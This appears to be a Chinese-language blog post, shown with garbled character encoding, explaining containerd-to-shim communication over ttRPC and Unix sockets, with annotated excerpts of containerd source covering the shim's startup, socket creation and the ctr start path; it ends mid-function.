containerd ä¹‹é—´çš„é€šä¿¡æ˜¯å®¹å™¨è¿è¡Œæ—¶çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œç¡®ä¿å®¹å™¨çš„åˆ›å»ºã€ç®¡ç†å’Œåˆ é™¤ç­‰æ“ä½œèƒ½å¤Ÿé¡ºåˆ©è¿›è¡Œã€‚å®ƒä»¬ä¹‹é—´çš„é€šä¿¡ä¸»è¦é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡Œï¼š\nttRPC containerd å’Œ containerd-shim ä¹‹é—´çš„é€šä¿¡ä¸»è¦é€šè¿‡ä¸€ç§ç§°ä¸º ttRPC çš„è½»é‡çº§ RPC æ¡†æ¶è¿›è¡Œã€‚ttRPC æ˜¯ containerd é¡¹ç›®ä¸­å¼•å…¥çš„ï¼Œä¸“é—¨è®¾è®¡ç”¨äºé«˜æ•ˆçš„è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰ï¼Œç‰¹åˆ«æ˜¯åœ¨åŒä¸€ä¸»æœºä¸Šè¿è¡Œçš„è¿›ç¨‹ä¹‹é—´ã€‚\nttRPC: ttRPC æ˜¯ containerd å›¢é˜Ÿå¼€å‘çš„ä¸€ç§ä¼˜åŒ–åçš„ RPC æ¡†æ¶ï¼Œæ—¨åœ¨æä¾›æ¯” gRPC æ›´ä½çš„å»¶è¿Ÿå’Œæ›´å°çš„å¼€é”€ã€‚å®ƒç›´æ¥é€šè¿‡ Unix åŸŸå¥—æ¥å­—è¿›è¡Œé€šä¿¡ï¼Œæ²¡æœ‰ HTTP/2 çš„å¼€é”€ã€‚ containerd ä½¿ç”¨ ttRPC æ¥å‘ containerd-shim å‘é€æ§åˆ¶å‘½ä»¤ï¼Œå¦‚å¯åŠ¨ã€åœæ­¢ã€æŒ‚èµ·å’Œåˆ é™¤å®¹å™¨ã€‚ åœ¨containerdä¸­æ˜¯è¿™æ ·å¯åŠ¨çš„\ntl, err := sys.GetLocalListener(config.TTRPC.Address, config.TTRPC.UID, config.TTRPC.GID) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for main ttrpc endpoint: %w\u0026#34;, err) } serve(ctx, tl, server.ServeTTRPC) Unix åŸŸå¥—æ¥å­— containerd å’Œ containerd-shim ä¹‹é—´çš„é€šä¿¡é€šå¸¸é€šè¿‡ Unix åŸŸå¥—æ¥å­—è¿›è¡Œã€‚è¿™ç§é€šä¿¡æ–¹å¼éå¸¸é€‚åˆåŒä¸€ä¸»æœºä¸Šçš„è¿›ç¨‹é—´é€šä¿¡ï¼Œå…·æœ‰ä½å»¶è¿Ÿå’Œé«˜æ•ˆçš„ç‰¹ç‚¹ã€‚\nUnix åŸŸå¥—æ¥å­—: åœ¨å¯åŠ¨æ—¶ï¼Œcontainerd-shim è¿›ç¨‹ä¼šé€šè¿‡ä¸€ä¸ªä¸“ç”¨çš„ Unix åŸŸå¥—æ¥å­—ä¸ containerd å»ºç«‹é€šä¿¡ã€‚ è¿™ä¸ªå¥—æ¥å­—é€šå¸¸ä½äº /run/containerd/ æˆ– /run/containerd/io.containerd.runtime.v2.linux/ ç›®å½•ä¸‹ï¼Œå¹¶å¸¦æœ‰å®¹å™¨ ID ç›¸å…³çš„å‘½åã€‚ å®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç† containerd é€šè¿‡ ttRPC å’Œ Unix åŸŸå¥—æ¥å­—ä¸ containerd-shim è¿›è¡Œé€šä¿¡ï¼Œä»¥ç®¡ç†å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸï¼š\nå®¹å™¨åˆ›å»º: å½“ containerd æ”¶åˆ°åˆ›å»ºå®¹å™¨çš„è¯·æ±‚æ—¶ï¼Œå®ƒä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„ containerd-shim è¿›ç¨‹ã€‚è¿™ä¸ªè¿›ç¨‹è´Ÿè´£åœ¨ runc æˆ–å…¶ä»– OCI å…¼å®¹çš„è¿è¡Œæ—¶ä¸Šè¿è¡Œå®¹å™¨ã€‚ å®¹å™¨ç®¡ç†: containerd-shim è¿›ç¨‹è´Ÿè´£å¤„ç†å®¹å™¨çš„æ ‡å‡†è¾“å…¥/è¾“å‡ºæµã€ä¿¡å·ç®¡ç†ä»¥åŠå…¶ä»–ä¸å®¹å™¨ç›¸å…³çš„æ“ä½œã€‚containerd é€šè¿‡ ttRPC å‘ containerd-shim å‘é€å‘½ä»¤ï¼ˆå¦‚å¯åŠ¨ã€åœæ­¢å®¹å™¨ï¼‰ã€‚ å®¹å™¨åˆ é™¤: å½“å®¹å™¨é€€å‡ºæ—¶ï¼Œcontainerd-shim è¿›ç¨‹å°†ç»§ç»­è¿è¡Œï¼Œç›´åˆ° containerd é€šè¿‡ ttRPC å‘½ä»¤å‘ŠçŸ¥ containerd-shim è¿›ç¨‹å¯ä»¥å®‰å…¨é€€å‡ºã€‚è¿™ç¡®ä¿äº†å³ä½¿ containerd å´©æºƒï¼Œå®¹å™¨è¿›ç¨‹ä¹Ÿä¸ä¼šè¢«ç»ˆæ­¢ã€‚ å®¹å™¨ä¸å®ˆæŠ¤è¿›ç¨‹çš„åˆ†ç¦» containerd-shim çš„å­˜åœ¨è¿˜ä½¿å¾—å®¹å™¨ä¸ containerd å®ˆæŠ¤è¿›ç¨‹åˆ†ç¦»ã€‚è¿™æ„å‘³ç€ï¼š\nç‹¬ç«‹æ€§: å³ä½¿ containerd å®ˆæŠ¤è¿›ç¨‹å´©æºƒæˆ–é‡å¯ï¼Œå·²ç»è¿è¡Œçš„å®¹å™¨ä»ç„¶èƒ½å¤Ÿç»§ç»­è¿è¡Œï¼Œå› ä¸ºå®ƒä»¬ç”±ç‹¬ç«‹çš„ containerd-shim è¿›ç¨‹ç®¡ç†ã€‚ å‡å°‘ä¾èµ–: è¿™ç§æ¶æ„å‡å°‘äº†å¯¹å•ç‚¹æ•…éšœçš„ä¾èµ–ï¼Œå¢å¼ºäº†å®¹å™¨è¿è¡Œçš„ç¨³å®šæ€§ã€‚ Containerd-shimä¸Containeré€šä¿¡æœºåˆ¶ é€šä¿¡æµç¨‹ containerd é€šè¿‡ä¸€ä¸ªruntimeæ¥å®ç°å¯¹å¤šä¸ªå®¹å™¨çš„æ§åˆ¶ï¼Œä¾‹å¦‚ createã€start å’Œ stopã€‚\né€šä¿¡æµç¨‹å¦‚ä¸‹ï¼š\næ¥è‡ª containerd çš„åˆ›å»ºå®¹å™¨çš„å®¢æˆ·ç«¯è¯·æ±‚ containerd è®¾ç½®å®¹å™¨çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶åˆ›å»ºå¿…è¦çš„é…ç½®ä¿¡æ¯ containerd è°ƒç”¨ shimï¼ŒåŒ…æ‹¬å®¹å™¨é…ç½®ï¼Œè¿™ä¸ªå®¹å™¨é…ç½®å†³å®šæ˜¯å¯åŠ¨æ–°çš„å¥—æ¥å­—ä¾¦å¬å™¨ï¼ˆshimä¸container 1ï¼š1ï¼‰è¿˜æ˜¯ä½¿ç”¨ç°æœ‰çš„å¥—æ¥å­—ä¾¦å¬å™¨ï¼ˆ1ï¼šå¤šï¼‰ å¦‚æœä½¿ç”¨ç°æœ‰å¥—æ¥å­—ï¼Œåˆ™è¿”å›ç°æœ‰ socket çš„åœ°å€å¹¶é€€å‡º å¦‚æœæ˜¯ä½¿ç”¨æ–°çš„å¥—æ¥å­—ï¼Œåˆ™shim a. åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹æ¥ä¾¦å¬å¥—æ¥å­—ä¸­æ¥è‡ª containerd çš„ ttRPC å‘½ä»¤ b. å°†è¯¥å¥—æ¥å­—çš„åœ°å€è¿”å›ç»™ containerd c. é€€å‡º containerd å‘ shim å‘é€ä¸€ä¸ªå‘½ä»¤æ¥å¯åŠ¨å®¹å™¨ containerd é€šè¿‡ API è°ƒç”¨runtimeæ¥åˆ›å»º/å¯åŠ¨/åœæ­¢å®¹å™¨ ä½†æ˜¯ï¼Œcontainerd æœ¬èº«å®é™…ä¸Šå¹¶ä¸ç›´æ¥è°ƒç”¨è¿è¡Œæ—¶æ¥å¯åŠ¨å®¹å™¨ã€‚ç›¸åï¼Œå®ƒæœŸæœ›è°ƒç”¨è¿è¡Œæ—¶ï¼Œè¿™å°†æš´éœ²ä¸€ä¸ªå¥—æ¥å­— ï¼Œ åœ¨ç±» Unix ç³»ç»Ÿä¸Šæ˜¯ Unix åŸŸï¼Œåœ¨ Windows ä¸Šåä¸º pipeï¼Œ å¹¶é€šè¿‡è¯¥å¥—æ¥å­—ä¸Šçš„ ttRPC ä¾¦å¬å®¹å™¨å‘½ä»¤ã€‚\nè¿è¡Œæ—¶æœ‰ä¸¤ç§å¸¸è§çš„æ¨¡å¼ï¼š\nä¸€ä¸ªç”¨äºè¿è¡Œæ—¶çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå®ƒæ—¢ä¾¦å¬å¥—æ¥å­—åˆåˆ›å»º/å¯åŠ¨/åœæ­¢å®¹å™¨ ä¸€ä¸ªåˆ†ç¦»çš„ Shim äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”¨äºä¾¦å¬å¥—æ¥å­—ï¼Œå¹¶è°ƒç”¨ä¸€ä¸ªå•ç‹¬çš„è¿è¡Œæ—¶å¼•æ“æ¥åˆ›å»º/å¯åŠ¨/åœæ­¢å®¹å™¨ ä½¿ç”¨å•ç‹¬çš„â€œshim + engineâ€æ¨¡å¼æ˜¯å› ä¸ºå®ƒå¯ä»¥æ›´è½»æ¾åœ°é›†æˆå®ç°ç‰¹å®šè¿è¡Œæ—¶å¼•æ“è§„èŒƒï¼ˆå¦‚ OCI è¿è¡Œæ—¶è§„èŒƒï¼‰çš„ä¸åŒè¿è¡Œæ—¶ã€‚ttRPC åè®®å¯ä»¥é€šè¿‡ä¸€ä¸ªruntime shimè¿›è¡Œå¤„ç†ï¼Œè€Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„è¿è¡Œæ—¶å¼•æ“å®ç°ï¼Œåªè¦å®ƒä»¬å®ç° OCI è¿è¡Œæ—¶è§„èŒƒå³å¯ã€‚\næœ€å¸¸ç”¨çš„è¿è¡Œæ—¶å¼•æ“æ˜¯ runcï¼Œå®ƒå®æ–½ OCI è¿è¡Œæ—¶è§„èŒƒã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªè¿è¡Œæ—¶å¼•æ“ï¼Œå› æ­¤ containerd ä¸ä¼šç›´æ¥è°ƒç”¨å®ƒ;ç›¸åï¼Œå®ƒç”± Shim è°ƒç”¨ï¼Œè¯¥ Shim ä¾¦å¬å¥—æ¥å­—å¹¶è°ƒç”¨è¿è¡Œæ—¶å¼•æ“ã€‚\nä»¥ä¸‹åºåˆ—å›¾æ˜¾ç¤ºäº†æ‰§è¡Œ ctr run å‘½ä»¤æ—¶çš„æ“ä½œæµç¨‹ã€‚\næºç è§£æ shimå¯åŠ¨å…¥å£ï¼šcontainerd/cmd/containerd-shim-runc-v2/main.go\nfunc main() { shim.Run(context.Background(a), manager.NewShimManager(\u0026#34;io.containerd.runc.v2\u0026#34;)) } Runå‡½æ•°ï¼šcontainerd/pkg/shim/shim.go\n// Run initializes and runs a shim server. func Run(ctx context.Context, manager Manager, opts ...BinaryOpts) { var config Config for _, o := range opts { o(\u0026amp;config) } ctx = log.WithLogger(ctx, log.G(ctx).WithField(\u0026#34;runtime\u0026#34;, manager.Name())) if err := run(ctx, manager, config); err != nil { fmt.Fprintf(os.Stderr, \u0026#34;%s: %s\u0026#34;, manager.Name(), err) os.Exit(1) } } shimçœŸæ­£å¯åŠ¨ï¼š\n//shim å¯åŠ¨ func run(ctx context.Context, manager Manager, config Config) error { //... setRuntime() //... // Handle explicit actions switch action { case \u0026#34;delete\u0026#34;: //... case \u0026#34;start\u0026#34;: opts := StartOpts{ Address: addressFlag, TTRPCAddress: ttrpcAddress, Debug: debugFlag, } // ç¬¬ä¸€ä¸ªå¯åŠ¨çš„shimæ¥æ”¶çš„action å°±æ˜¯ startã€‚è¿™é‡Œå¯åŠ¨ç¬¬äºŒä¸ªshimã€‚addressæ˜¯æ ¹æ®nså’Œidå“ˆå¸Œå‡ºæ¥çš„ï¼Œä¼šä¼ é€’ç»™ç¬¬äºŒä¸ªshim,ç¬¬äºŒä¸ªshimä¼šä»¥è¿™ä¸ªåœ°å€èµ·ä¸€ä¸ªserverï¼ŒåŒæ—¶ä¼šé€šè¿‡stdoutå‘é€ç»™containerdï¼ˆå› ä¸ºcå¯åŠ¨çš„æœ¬è¿›ç¨‹ï¼Œæ‰€ä»¥å¯ä»¥æ”¶åˆ°ï¼‰ï¼Œè¿™å°±æ˜¯containerdå’Œç¬¬äºŒä¸ªshimäº¤æµçš„.sockåœ°å€ã€‚ params, err := manager.Start(ctx, id, opts) if err != nil { return err } data, err := json.Marshal(\u0026amp;params) if err != nil { return fmt.Errorf(\u0026#34;failed to marshal bootstrap params to json: %w\u0026#34;, err) } if _, err := os.Stdout.Write(data); err != nil { return err } return nil } //... unaryInterceptor := chainUnaryServerInterceptors(ttrpcUnaryInterceptors...) server, err := newServer(ttrpc.WithUnaryServerInterceptor(unaryInterceptor)) if err != nil { return fmt.Errorf(\u0026#34;failed creating server: %w\u0026#34;, err) } for _, srv := range ttrpcServices { if err := srv.RegisterTTRPC(server); err != nil { return fmt.Errorf(\u0026#34;failed to register service: %w\u0026#34;, err) } } if err := serve(ctx, server, signals, sd.Shutdown); err != nil { if !errors.Is(err, shutdown.ErrShutdown) { cleanupSockets(ctx) return err } } //... } å¯åŠ¨ç¬¬äºŒä¸ªshimï¼š\nè¿™é‡Œæœ‰ä¸€ä¸ªæœ‰æ„æ€åœ°æ–¹æ˜¯ç¬¬äºŒä¸ªshimå¦‚ä½•è·å–è‡ªèº«ä½œä¸ºserverçš„socketåœ°å€ã€‚ä»ä»£ç ä¸Šçœ‹æ˜¯é€šè¿‡æŠŠå¥—æ¥å­—è½¬æ¢æˆæ–‡ä»¶æè¿°ç¬¦ä¼ é€’ç»™ç¬¬äºŒä¸ªshimï¼Œç„¶åç¬¬äºŒä¸ªshimå†è¿˜åŸæˆlistenerå®ç°çš„ã€‚\nfunc (manager) Start(ctx context.Context, id string, opts shim.StartOpts) (_ shim.BootstrapParams, retErr error) { var params shim.BootstrapParams params.Version = 3 params.Protocol = \u0026#34;ttrpc\u0026#34; cmd, err := newCommand(ctx, id, opts.Address, opts.TTRPCAddress, opts.Debug) if err != nil { return params, err } grouping := id spec, err := readSpec() //... var sockets []*shimSocket s, err := newShimSocket(ctx, opts.Address, grouping, false) if err != nil { if errdefs.IsAlreadyExists(err) { params.Address = s.addr return params, nil } return params, err } sockets = append(sockets, s) cmd.ExtraFiles = append(cmd.ExtraFiles, s.f) goruntime.LockOSThread() if os.Getenv(\u0026#34;SCHED_CORE\u0026#34;) != \u0026#34;\u0026#34; { if err := schedcore.Create(schedcore.ProcessGroup); err != nil { return params, fmt.Errorf(\u0026#34;enable sched core support: %w\u0026#34;, err) } } if err := cmd.Start(); err != nil { return params, err } goruntime.UnlockOSThread() // å¯åŠ¨æˆåŠŸåï¼Œç¬¬ä¸€ä¸ª shim é€€å‡ºï¼Œæ‰§è¡Œæ¸…ç†æ“ä½œ defer func() { if retErr != nil { cmd.Process.Kill() } }() // make sure to wait after start go cmd.Wait() //... params.Address = sockets[0].addr return params, nil } shim socketå¥—æ¥å­—åˆ›å»ºï¼š\n//shim socketåˆ›å»º func newShimSocket(ctx context.Context, path, id string, debug bool) (*shimSocket, error) { address, err := shim.SocketAddress(ctx, path, id, debug) socket, err := shim.NewSocket(address) //... s := \u0026amp;shimSocket{ addr: address, s: socket, } f, err := socket.File() if err != nil { s.Close() return nil, err } s.f = f return s, nil } SocketAddressï¼šç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„ä½äº/run/containerd/s/\u0026lt;å“ˆå¸Œå€¼\u0026gt;ä¸‹çš„Unix å¥—æ¥å­—åœ°å€\n// SocketAddress returns a socket address func SocketAddress(ctx context.Context, socketPath, id string, debug bool) (string, error) { ns, err := namespaces.NamespaceRequired(ctx) if err != nil { return \u0026#34;\u0026#34;, err } path := filepath.Join(socketPath, ns, id) if debug { path = filepath.Join(path, \u0026#34;debug\u0026#34;) } d := sha256.Sum256([]byte(path)) return fmt.Sprintf(\u0026#34;unix://%s/%x\u0026#34;, filepath.Join(socketRoot, \u0026#34;s\u0026#34;), d), nil } NewSocketï¼šè®¾ç½®sockæ–‡ä»¶æƒé™\n//çœŸæ­£çš„socketåˆ›å»º // NewSocket returns a new socket func NewSocket(address string) (*net.UnixListener, error) { var ( sock = socket(address) path = sock.path() isAbstract = sock.isAbstract() perm = os.FileMode(0600) ) // Darwin needs +x to access socket, otherwise it\u0026#39;ll fail with \u0026#34;bind: permission denied\u0026#34; when running as non-root. if runtime.GOOS == \u0026#34;darwin\u0026#34; { perm = 0700 } if !isAbstract { if err := os.MkdirAll(filepath.Dir(path), perm); err != nil { return nil, fmt.Errorf(\u0026#34;mkdir failed for %s: %w\u0026#34;, path, err) } } l, err := net.Listen(\u0026#34;unix\u0026#34;, path) if err != nil { return nil, err } if !isAbstract { if err := os.Chmod(path, perm); err != nil { os.Remove(sock.path()) l.Close() return nil, fmt.Errorf(\u0026#34;chmod failed for %s: %w\u0026#34;, path, err) } } return l.(*net.UnixListener), nil } serveå‡½æ•°ï¼Œå¯åŠ¨ ttrpc æœåŠ¡ï¼Œå¹¶æä¾›RPCæœåŠ¡ï¼š\n// serve serves the ttrpc API over a unix socket in the current working directory // and blocks until the context is canceled func serve(ctx context.Context, server *ttrpc.Server, signals chan os.Signal, shutdown func()) error { dump := make(chan os.Signal, 32) setupDumpStacks(dump) path, err := os.Getwd() if err != nil { return err } //åˆ›å»º Unix å¥—æ¥å­—ç›‘å¬å™¨ l, err := serveListener(socketFlag, 3) if err != nil { return err } // å¯åŠ¨ ttrpc æœåŠ¡å™¨ go func() { defer l.Close() if err := server.Serve(ctx, l); err != nil \u0026amp;\u0026amp; !errors.Is(err, net.ErrClosed) { log.G(ctx).WithError(err).Fatal(\u0026#34;containerd-shim: ttrpc server failure\u0026#34;) } }() //... go handleExitSignals(ctx, logger, shutdown) return reap(ctx, logger, signals) } åˆ›å»ºä¸€ä¸ªç”¨äºç›‘å¬ Unix å¥—æ¥å­—çš„ net.Listener\n// serve()ä¼šæœ€ç»ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°æ¥å¯åŠ¨æœåŠ¡ç›‘å¬ func serveListener(path string, fd uintptr) (net.Listener, error) { //åˆ›å»ºç›‘å¬å™¨çš„é€»è¾‘ var ( l net.Listener err error ) //å¤„ç†ç»§æ‰¿çš„æ–‡ä»¶æè¿°ç¬¦ if path == \u0026#34;\u0026#34; { //os.NewFile(fd, \u0026#34;socket\u0026#34;) å°†æ–‡ä»¶æè¿°ç¬¦ fd å°è£…æˆ //ä¸€ä¸ª*os.File å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨ net.FileListener å°†å…¶ //è½¬æ¢ä¸º net.Listenerï¼Œè¿™æ ·å¯ä»¥é€šè¿‡å¥—æ¥å­—è¿›è¡Œé€šä¿¡ã€‚ l, err = net.FileListener(os.NewFile(fd, \u0026#34;socket\u0026#34;)) path = \u0026#34;[inherited from parent]\u0026#34; } else { //åˆ›å»ºæ–°çš„ Unix å¥—æ¥å­— if len(path) \u0026gt; socketPathLimit { return nil, fmt.Errorf(\u0026#34;%q: unix socket path too long (\u0026gt; %d)\u0026#34;, path, socketPathLimit) } l, err = net.Listen(\u0026#34;unix\u0026#34;, path) } if err != nil { return nil, err } log.L.WithField(\u0026#34;socket\u0026#34;, path).Debug(\u0026#34;serving api on socket\u0026#34;)Â· return l, nil } å›åˆ°serveå‡½æ•°ï¼Œcontainerd-shimä»¥æ³¨å†ŒæœåŠ¡çš„å½¢å¼æ¥å¯¹containerdæä¾›å®¹å™¨ç›¸å…³æ“ä½œï¼Œä¸‹é¢æ˜¯ç›¸å…³æœåŠ¡æ³¨å†Œçš„æºç ï¼Œå¯ä»¥çœ‹åˆ°shimé€šè¿‡è°ƒç”¨runcå®¹å™¨è¿è¡Œæ—¶æ¥åˆ›å»ºå®¹å™¨ã€‚\nfunc (s *service) RegisterTTRPC(server *ttrpc.Server) error { taskAPI.RegisterTTRPCTaskService(server, s) return nil } // Create a new initial process and container with the underlying OCI runtime func (s *service) Create(ctx context.Context, r *taskAPI.CreateTaskRequest) (_ *taskAPI.CreateTaskResponse, err error) { s.mu.Lock() defer s.mu.Unlock() s.lifecycleMu.Lock() handleStarted, cleanup := s.preStart(nil) s.lifecycleMu.Unlock() defer cleanup() container, err := runc.NewContainer(ctx, s.platform, r) if err != nil { return nil, err } s.containers[r.ID] = container s.send(\u0026amp;eventstypes.TaskCreate{ ContainerID: r.ID, Bundle: r.Bundle, Rootfs: r.Rootfs, IO: \u0026amp;eventstypes.TaskIO{ Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Terminal: r.Terminal, }, Checkpoint: r.Checkpoint, Pid: uint32(container.Pid()), }) // The following line cannot return an error as the only state in which that // could happen would also cause the container.Pid() call above to // nil-deference panic. proc, _ := container.Process(\u0026#34;\u0026#34;) handleStarted(container, proc) return \u0026amp;taskAPI.CreateTaskResponse{ Pid: uint32(container.Pid()), }, nil } æ³¨ï¼šshimåˆ›å»ºçš„ä¸containerdé€šä¿¡çš„sockæ–‡ä»¶çš„modeä¸º0600ï¼Œå®é™…æƒ…å†µä¸æºç ä¸€è‡´ã€‚\nå®¹å™¨å¯åŠ¨æµç¨‹åˆ†æ åˆ†ææµç¨‹å›¾å¦‚ä¸‹ï¼Œtask.Startæ²¡æœ‰å¾€ä¸‹åˆ†æï¼Œå®ƒçš„å‡½æ•°ä¼ é€’æµç¨‹ä¸Newtaskç±»ä¼¼ã€‚\nctrè§£æå‘½ä»¤\n//è°ƒç”¨command.NewClient()-\u0026gt;client.LoadContainer()-\u0026gt;NewTask()-\u0026gt;task.Start() /* 1ã€command.NewClient() åˆ›å»ºcontainerd client 2ã€LoadContainer() 3ã€NewTask() 4ã€task.Start() //å¦‚æœæ”¶åˆ°é€€å‡ºä¿¡å· 5ã€task.Delete(ctx) */ var startCommand = \u0026amp;cli.Command{ Name: \u0026#34;start\u0026#34;, Usage: \u0026#34;Start a container that has been created\u0026#34;, ArgsUsage: \u0026#34;CONTAINER\u0026#34;, Flags: append(platformStartFlags, []cli.Flag{ \u0026amp;cli.BoolFlag{ Name: \u0026#34;null-io\u0026#34;, Usage: \u0026#34;Send all IO to /dev/null\u0026#34;, }, \u0026amp;cli.StringFlag{ Name: \u0026#34;log-uri\u0026#34;, Usage: \u0026#34;Log uri\u0026#34;, }, \u0026amp;cli.StringFlag{ Name: \u0026#34;fifo-dir\u0026#34;, Usage: \u0026#34;Directory used for storing IO FIFOs\u0026#34;, }, \u0026amp;cli.StringFlag{ Name: \u0026#34;pid-file\u0026#34;, Usage: \u0026#34;File path to write the task\u0026#39;s pid\u0026#34;, }, \u0026amp;cli.BoolFlag{ Name: \u0026#34;detach\u0026#34;, Aliases: []string{\u0026#34;d\u0026#34;}, Usage: \u0026#34;Detach from the task after it has started execution\u0026#34;, }, }...), Action: func(cliContext *cli.Context) error { var ( err error id = cliContext.Args().Get(0) detach = cliContext.Bool(\u0026#34;detach\u0026#34;) ) if id == \u0026#34;\u0026#34; { return errors.New(\u0026#34;container id must be provided\u0026#34;) } client, ctx, cancel, err := commands.NewClient(cliContext) container, err := client.LoadContainer(ctx, id) spec, err := container.Spec(ctx) var ( tty = spec.Process.Terminal opts = GetNewTaskOpts(cliContext) ioOpts = []cio.Opt{cio.WithFIFODir(cliContext.String(\u0026#34;fifo-dir\u0026#34;))} ) var con console.Console if tty { con = console.Current() defer con.Reset() if err := con.SetRaw(); err != nil { return err } } task, err := NewTask(ctx, client, container, \u0026#34;\u0026#34;, con, cliContext.Bool(\u0026#34;null-io\u0026#34;), cliContext.String(\u0026#34;log-uri\u0026#34;), ioOpts, opts...) //... if err := task.Start(ctx); err != nil { return err } if tty { if err := HandleConsoleResize(ctx, task, con); err != nil { log.L.WithError(err).Error(\u0026#34;console resize\u0026#34;) } } else { sigc := commands.ForwardAllSignals(ctx, task) defer commands.StopCatch(sigc) } status := \u0026lt;-statusC code, _, err := status.Result() if err != nil { return err } if _, err := task.Delete(ctx); err != nil { return err } if code != 0 { return cli.Exit(\u0026#34;\u0026#34;, int(code)) } return nil }, } 1ã€containerd clientåˆ›å»º\n// containerd\\containerd\\cmd\\ctr\\commands\\client.go // NewClient returns a new containerd client func NewClient(cliContext *cli.Context, opts ...containerd.Opt) (*containerd.Client, context.Context, context.CancelFunc, error) { timeoutOpt := containerd.WithTimeout(cliContext.Duration(\u0026#34;connect-timeout\u0026#34;)) opts = append(opts, timeoutOpt) client, err := containerd.New(cliContext.String(\u0026#34;address\u0026#34;), opts...) if err != nil { return nil, nil, nil, err } ctx, cancel := AppContext(cliContext) var suppressDeprecationWarnings bool if !suppressDeprecationWarnings { resp, err := client.IntrospectionService().Server(ctx) if err != nil { log.L.WithError(err).Warn(\u0026#34;Failed to check deprecations\u0026#34;) } else { for _, d := range resp.Deprecations { log.L.Warn(\u0026#34;DEPRECATION: \u0026#34; + d.Message) } } } return client, ctx, cancel, nil } 1ã€å®é™…è°ƒç”¨Newå‡½æ•°åˆ›å»º\n// containerd\\containerd\\client\\client.go // New returns a new containerd client that is connected to the containerd // instance provided by address func New(address string, opts ...Opt) (*Client, error) { var copts clientOpts for _, o := range opts { if err := o(\u0026amp;copts); err != nil { return nil, err } } if copts.timeout == 0 { copts.timeout = 10 * time.Second } c := \u0026amp;Client{ defaultns: copts.defaultns, } if copts.defaultRuntime != \u0026#34;\u0026#34; { c.runtime = copts.defaultRuntime } else { c.runtime = defaults.DefaultRuntime } if copts.defaultPlatform != nil { c.platform = copts.defaultPlatform } else { c.platform = platforms.Default() } if copts.services != nil { c.services = *copts.services } if address != \u0026#34;\u0026#34; { backoffConfig := backoff.DefaultConfig backoffConfig.MaxDelay = copts.timeout connParams := grpc.ConnectParams{ Backoff: backoffConfig, } gopts := []grpc.DialOption{ grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithConnectParams(connParams), grpc.WithContextDialer(dialer.ContextDialer), } if len(copts.dialOptions) \u0026gt; 0 { gopts = copts.dialOptions } gopts = append(gopts, grpc.WithDefaultCallOptions( grpc.MaxCallRecvMsgSize(defaults.DefaultMaxRecvMsgSize), grpc.MaxCallSendMsgSize(defaults.DefaultMaxSendMsgSize))) if len(copts.callOptions) \u0026gt; 0 { gopts = append(gopts, grpc.WithDefaultCallOptions(copts.callOptions...)) } if copts.defaultns != \u0026#34;\u0026#34; { unary, stream := newNSInterceptors(copts.defaultns) gopts = append(gopts, grpc.WithChainUnaryInterceptor(unary)) gopts = append(gopts, grpc.WithChainStreamInterceptor(stream)) } connector := func() (*grpc.ClientConn, error) { conn, err := grpc.NewClient(dialer.DialAddress(address), gopts...) if err != nil { return nil, fmt.Errorf(\u0026#34;failed to dial %q: %w\u0026#34;, address, err) } return conn, nil } conn, err := connector() if err != nil { return nil, err } c.conn, c.connector = conn, connector } if copts.services == nil \u0026amp;\u0026amp; c.conn == nil { return nil, fmt.Errorf(\u0026#34;no grpc connection or services is available: %w\u0026#34;, errdefs.ErrUnavailable) } // check namespace labels for default runtime if copts.defaultRuntime == \u0026#34;\u0026#34; \u0026amp;\u0026amp; c.defaultns != \u0026#34;\u0026#34; { if label, err := c.GetLabel(context.Background(), defaults.DefaultRuntimeNSLabel); err != nil { return nil, err } else if label != \u0026#34;\u0026#34; { c.runtime = label } } return c, nil } 2ã€åŠ è½½container\n// containerd\\containerd\\client\\client.go // LoadContainer loads an existing container from metadata func (c *Client) LoadContainer(ctx context.Context, id string) (Container, error) { ctx, span := tracing.StartSpan(ctx, \u0026#34;client.LoadContainer\u0026#34;) defer span.End() r, err := c.ContainerService().Get(ctx, id) if err != nil { return nil, err } span.SetAttributes( tracing.Attribute(\u0026#34;container.id\u0026#34;, r.ID), tracing.Attribute(\u0026#34;container.image.ref\u0026#34;, r.Image), tracing.Attribute(\u0026#34;container.runtime.name\u0026#34;, r.Runtime.Name), tracing.Attribute(\u0026#34;container.snapshotter.name\u0026#34;, r.Snapshotter), tracing.Attribute(\u0026#34;container.createdAt\u0026#34;, r.CreatedAt.Format(time.RFC3339)), tracing.Attribute(\u0026#34;container.updatedAt\u0026#34;, r.UpdatedAt.Format(time.RFC3339)), ) return containerFromRecord(c, r), nil } 2ã€ContainerServiceå®é™…æ˜¯è°ƒç”¨çš„NewRemoteContainerStoreï¼Œè¿”å›NewContainersClient\n// ContainerService returns the underlying container Store func (c *Client) ContainerService() containers.Store { if c.containerStore != nil { return c.containerStore } c.connMu.Lock() defer c.connMu.Unlock() return NewRemoteContainerStore(containersapi.NewContainersClient(c.conn)) } 2ã€gRPCè°ƒç”¨containerdçš„containers.Getå‡½æ•°\ncontainerd/containerd/api/services/containers/v1/containers_grpc.pb.go\nfunc (c *containersClient) Get(ctx context.Context, in *GetContainerRequest, opts ...grpc.CallOption) (*GetContainerResponse, error) { out := new(GetContainerResponse) err := c.cc.Invoke(ctx, \u0026#34;/containerd.services.containers.v1.Containers/Get\u0026#34;, in, out, opts...) if err != nil { return nil, err } return out, nil } 2ã€containerdæ¥æ”¶å¹¶å¤„ç†è¯·æ±‚\n// containerd/containerd/api/services/containers/v1/containers_grpc.pb.go func _Containers_Get_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) { in := new(GetContainerRequest) if err := dec(in); err != nil { return nil, err } if interceptor == nil { return 